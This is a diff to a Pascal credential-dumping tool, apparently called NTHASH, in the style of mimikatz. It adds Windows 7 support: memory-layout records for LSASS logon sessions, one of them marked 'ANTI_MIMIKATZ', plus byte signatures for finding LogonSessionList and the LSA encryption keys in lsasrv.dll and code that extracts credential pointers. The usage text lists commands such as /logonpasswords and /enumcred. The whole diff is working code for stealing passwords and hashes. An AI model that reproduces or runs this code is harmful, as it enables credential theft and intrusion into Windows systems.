@@ -105,6 +105,81 @@ type _KIWI_MSV1_0_LIST_63 =record
         end;
  PKIWI_MSV1_0_LIST_63=^_KIWI_MSV1_0_LIST_63;
 
+ type _KIWI_MSV1_0_LIST_61 =record
+ 	Flink:nativeuint;	//off_2C5718
+ 	Blink:nativeuint; //off_277380
+ 	unk0:pvoid; // unk_2C0AC8
+ 	unk1:ULONG; // 0FFFFFFFFh
+ 	unk2:PVOID; // 0
+ 	unk3:ULONG; // 0
+ 	unk4:ULONG; // 0
+ 	unk5:ULONG; // 0A0007D0h
+	hSemaphore6:handle; // 0F9Ch
+	unk7:PVOID; // 0
+	hSemaphore8:HANDLE; // 0FB8h
+	unk9:PVOID; // 0
+	unk10:PVOID; // 0
+	unk11:ULONG; // 0
+	unk12:ULONG; // 0
+	unk13:PVOID; // unk_2C0A28
+	LocallyUniqueIdentifier:_LUID; //LUID would work
+	SecondaryLocallyUniqueIdentifier:_LUID;
+	UserName:LSA_UNICODE_STRING;
+	Domain:LSA_UNICODE_STRING;
+	unk14:PVOID;
+	unk15:PVOID;
+	pSid:PSID;
+	LogonType:ULONG;
+	Session:ULONG;
+	LogonTime:LARGE_INTEGER; // autoalign x86
+	LogonServer:LSA_UNICODE_STRING;
+        Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
+        unk19:PVOID;
+        unk20:PVOID;
+        unk21:PVOID;
+        unk22:ULONG;
+	CredentialManager:PVOID
+end;
+   PKIWI_MSV1_0_LIST_61=^_KIWI_MSV1_0_LIST_61;
+
+type _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  =record
+	Flink:nativeuint;	//off_2C5718
+	Blink:nativeuint; //off_277380
+	unk0:pvoid; // unk_2C0AC8
+	unk1:ULONG; // 0FFFFFFFFh
+	unk2:PVOID; // 0
+	unk3:ULONG; // 0
+	unk4:ULONG; // 0
+	unk5:ULONG; // 0A0007D0h
+       hSemaphore6:handle; // 0F9Ch
+       unk7:PVOID; // 0
+       hSemaphore8:HANDLE; // 0FB8h
+       unk9:PVOID; // 0
+       unk10:PVOID; // 0
+       unk11:ULONG; // 0
+       unk12:ULONG; // 0
+       unk13:PVOID; // unk_2C0A28
+       LocallyUniqueIdentifier:_LUID; //LUID would work
+       SecondaryLocallyUniqueIdentifier:_LUID;
+       waza:array[0..11] of byte; /// to do (maybe align)
+       UserName:LSA_UNICODE_STRING;
+       Domain:LSA_UNICODE_STRING;
+       unk14:PVOID;
+       unk15:PVOID;
+       pSid:PSID;
+       LogonType:ULONG;
+       Session:ULONG;
+       LogonTime:LARGE_INTEGER; // autoalign x86
+       LogonServer:LSA_UNICODE_STRING;
+       Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
+       unk19:PVOID;
+       unk20:PVOID;
+       unk21:PVOID;
+       unk22:ULONG;
+       CredentialManager:PVOID
+end;
+  PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ=^_KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ ;
+
 type _generic_list=record
         unk1:nativeuint;
         unk2:nativeuint;
@@ -239,8 +314,8 @@ type i_logsesslist=record
 
 
 const
-WIN_X64_Int_User_Info:array[0..3] of byte=($49, $8d, $41, $20);
-WIN_X86_Int_User_Info:array[0..4] of byte=($c6, $40, $22, $00, $8b);
+PTRN_WALL_SampQueryInformationUserInternal:array[0..3] of byte=($49, $8d, $41, $20);
+PTRN_WALL_SampQueryInformationUserInternal_X86:array[0..4] of byte=($c6, $40, $22, $00, $8b);
 
 var
   lsass_pid:dword=0;
@@ -304,9 +379,9 @@ const
  PTRN_WALL_LsaInitializeProtectedMemory_KEY_X86:array[0..4]  of byte=  ($6a, $02, $6a, $10, $68);
 var
 pattern:array of byte;
- IV_OFFSET:ShortInt ; //signed byte
- DES_OFFSET:ShortInt ; //signed byte
- AES_OFFSET:ShortInt ; //signed byte
+ IV_OFFSET:ShortInt=0 ; //signed byte
+ DES_OFFSET:ShortInt=0 ; //signed byte
+ AES_OFFSET:ShortInt=0 ; //signed byte
  hmod:thandle=0;
  MODINFO:  MODULEINFO;
  keySigOffset:nativeuint;
@@ -334,7 +409,7 @@ if lowercase(osarch) ='x86' then
    end;
 if lowercase(osarch) ='amd64' then
    begin
-   if copy(winver,1,3)='6.0' then //win7
+   if copy(winver,1,3)='6.1' then //win7
       begin
       setlength(pattern,sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
       CopyMemory(@pattern[0],@PTRN_WNO8_LsaInitializeProtectedMemory_KEY[0],sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
@@ -355,6 +430,11 @@ if lowercase(osarch) ='amd64' then
       //{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
       //{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),	PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
       end;
+   end;
+if IV_OFFSET=0 then
+   begin
+   log('no offset defined for this OS',1);
+   exit;
    end;
 //*************************
 hmod:=loadlibrary('lsasrv.dll');
@@ -577,13 +657,13 @@ begin
 
   if LowerCase (osarch )='amd64' then
      begin
-     setlength(pattern,length(WIN_X64_Int_User_Info));
-     CopyMemory (@pattern[0],@WIN_X64_Int_User_Info[0],length(WIN_X64_Int_User_Info));
+     setlength(pattern,length(PTRN_WALL_SampQueryInformationUserInternal));
+     CopyMemory (@pattern[0],@PTRN_WALL_SampQueryInformationUserInternal[0],length(PTRN_WALL_SampQueryInformationUserInternal));
      end
      else
      begin
-     setlength(pattern,length(WIN_X86_Int_User_Info));
-     CopyMemory (@pattern[0],@WIN_X86_Int_User_Info[0],length(WIN_X86_Int_User_Info));
+     setlength(pattern,length(PTRN_WALL_SampQueryInformationUserInternal_X86));
+     CopyMemory (@pattern[0],@PTRN_WALL_SampQueryInformationUserInternal_X86[0],length(PTRN_WALL_SampQueryInformationUserInternal_X86));
      end;
 result:=pattern;
 end;
@@ -632,6 +712,7 @@ begin
   if (lowercase(osarch)='amd64') then
      begin
      if copy(winver,1,3)='6.0' then patch_pos :=WIN_BUILD_VISTA;
+     if copy(winver,1,3)='6.1' then patch_pos :=WIN_BUILD_VISTA; //win7
      if copy(winver,1,3)='6.3' then patch_pos :=WIN_BUILD_BLUE; //win 8.1
      if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507;
      if (pos('-1703',winver)>0) then patch_pos :=WIN_BUILD_10_1703;
@@ -737,9 +818,10 @@ const
   PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
   //1703 works for 1709
   PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
+  PTRN_WN61_LogonSessionList:array [0..11] of byte=($33, $f6, $45, $89, $2f, $4c, $8b, $f3, $85, $ff, $0f, $84);
   PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
   PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
-  //x86
+//x86
   PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
   after:array[0..1] of byte=($eb,$04);
   //after:array[0..1] of byte=($0F,$84);
@@ -769,6 +851,13 @@ begin
   //
   if (lowercase(osarch)='amd64') then
      begin
+     if copy(winver,1,3)='6.1' then
+        begin
+        setlength(pattern,sizeof(PTRN_WN61_LogonSessionList));
+        copymemory(@pattern[0],@PTRN_WN61_LogonSessionList[0],sizeof(PTRN_WN61_LogonSessionList));
+        //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
+        patch_pos:=19;
+        end ;
      if copy(winver,1,3)='6.3' then
         begin
         setlength(pattern,sizeof(PTRN_WN63_LogonSessionList));
@@ -845,7 +934,6 @@ begin
                                    //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
                                    //new offset to the list entry
                                    {$ifdef CPU64}
-
                                    offset:= offset+offset_list_dword+4+patch_pos;
                                    {$endif CPU64}
                                    {$ifdef CPU32}
@@ -880,7 +968,9 @@ begin
                                    //
                                    log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
                                    //
-                                   credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager);
+                                   if copy(winver,1,3)='6.1'
+                                      then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).CredentialManager)
+                                      else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager);
                                    log('->CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
                                    first:=0;
                                    if Credentials<>0 then
@@ -929,7 +1019,9 @@ begin
                                      end; //while 1=1 do
                                      end; //if Credentials<>0 then
                                    //
-                                   credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
+                                   if copy(winver,1,3)='6.1'
+                                      then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).Credentials)
+                                      else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
                                    log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
                                    if Credentials<>0 then
                                      begin
@@ -1280,6 +1372,7 @@ begin
   log('NTHASH /getlsakeys',1);
   log('NTHASH /wdigest',1);
   log('NTHASH /logonpasswords',1);
+  log('NTHASH /enumcred',1);
   log('NTHASH /cryptunprotectdata /input:filename',1);
   log('NTHASH /cryptprotectdata /input:string',1);
   log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
@@ -1329,7 +1422,11 @@ begin
   p:=pos('/enumcred',cmdline);
   if p>0 then
      begin
-       try CredEnum; except end;
+       try
+       if CredEnum=true then log('enumcred OK',1) else log('enumcred NOT OK',1);
+       except
+       on e:exception do log(e.message);
+       end;
      end;
   p:=pos('/getlsakeys',cmdline);
   if p>0 then
